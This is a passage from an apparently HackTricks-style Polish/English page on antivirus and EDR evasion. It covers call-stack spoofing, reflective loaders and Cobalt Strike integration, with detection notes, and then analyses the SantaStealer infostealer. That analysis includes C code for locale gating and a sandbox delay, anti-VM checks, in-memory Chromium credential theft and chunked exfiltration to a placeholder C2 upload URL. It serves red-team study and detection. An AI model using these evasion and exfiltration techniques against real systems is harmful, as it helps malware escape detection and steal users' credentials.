- Draugr‑style PIC stubs budują fałszywy łańcuch wywołań (adresy powrotu do modułów nieszkodliwych) i następnie pivotują do prawdziwego API.
- To obezwładnia detekcje, które oczekują kanonicznych stosów z Beacon/BOFs do wrażliwych API.
- Łącz z technikami stack cutting/stack stitching, aby trafić do oczekiwanych ramek przed prologiem API.

Operational integration
- Dodaj reflective loader przed post‑ex DLL, tak aby PIC i hooki inicjalizowały się automatycznie po załadowaniu DLL.
- Użyj Aggressor script do zarejestrowania docelowych API, aby Beacon i BOFs transparentnie korzystały z tej samej ścieżki unikania bez zmian w kodzie.

Detection/DFIR considerations
- Integralność IAT: wpisy rozwiązywane do non‑image (heap/anon) adresów; okresowa weryfikacja wskaźników importu.
- Anomalie stosu: adresy powrotu nie należące do załadowanych obrazów; gwałtowne przejścia do non‑image PIC; niespójne pochodzenie RtlUserThreadStart.
- Telemetria loadera: zapisy w procesie do IAT, wczesna aktywność DllMain modyfikująca import thunks, nieoczekiwane regiony RX tworzone podczas ładowania.
- Ewazja przy ładowaniu obrazów: jeśli hookujesz LoadLibrary*, monitoruj podejrzane ładowania automation/clr assemblies skorelowane ze zdarzeniami maskowania pamięci.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer — techniki operacyjne dla Fileless Evasion i kradzieży poświadczeń

SantaStealer (aka BluelineStealer) ilustruje, jak nowoczesne info‑stealers łączą AV bypass, anti‑analysis i dostęp do poświadczeń w jednym workflow.

### Keyboard layout gating & sandbox delay

- Flaga konfiguracyjna (`anti_cis`) enumeruje zainstalowane układy klawiatury za pomocą `GetKeyboardLayoutList`. Jeśli wykryty zostanie układ cyrylicki, próbka upuszcza pusty marker `CIS` i kończy działanie przed uruchomieniem stealers, zapewniając, że nigdy nie detonuje na wykluczonych lokalizacjach, pozostawiając jednocześnie artefakt do polowania.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Wielowarstwowa logika `check_antivm`

- Wariant A przegląda listę procesów, oblicza dla każdej nazwy niestandardowy rolling checksum i porównuje go z wbudowanymi blocklistami dla debuggers/sandboxes; powtarza checksum dla nazwy komputera i sprawdza katalogi robocze takie jak `C:\analysis`.
- Wariant B sprawdza właściwości systemu (próg liczby procesów, czas pracy), wywołuje `OpenServiceA("VBoxGuest")` żeby wykryć dodatki VirtualBox i wykonuje timing checks wokół sleepów, aby wychwycić single-stepping. Jakiekolwiek trafienie przerywa działanie przed uruchomieniem modułów.

### Fileless helper + double ChaCha20 reflective loading

- The primary DLL/EXE embeds a Chromium credential helper that is either dropped to disk or manually mapped in-memory; fileless mode resolves imports/relocations itself so no helper artifacts are written.
- That helper stores a second-stage DLL encrypted twice with ChaCha20 (two 32-byte keys + 12-byte nonces). After both passes, it reflectively loads the blob (no `LoadLibrary`) and calls exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derived from [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- The ChromElevator routines use direct-syscall reflective process hollowing to inject into a live Chromium browser, inherit AppBound Encryption keys, and decrypt passwords/cookies/credit cards straight from SQLite databases despite ABE hardening.


### Modularna in-memory collection & chunked HTTP exfil

- `create_memory_based_log` iterates a global `memory_generators` function-pointer table and spawns one thread per enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Each thread writes results into shared buffers and reports its file count after a ~45s join window.
- Once finished, everything is zipped with the statically linked `miniz` library as `%TEMP%\\Log.zip`. `ThreadPayload1` then sleeps 15s and streams the archive in 10 MB chunks via HTTP POST to `http://<C2>:6767/upload`, spoofing a browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Each chunk adds `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>`, and the last chunk appends `complete: true` so the C2 knows reassembly is done.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
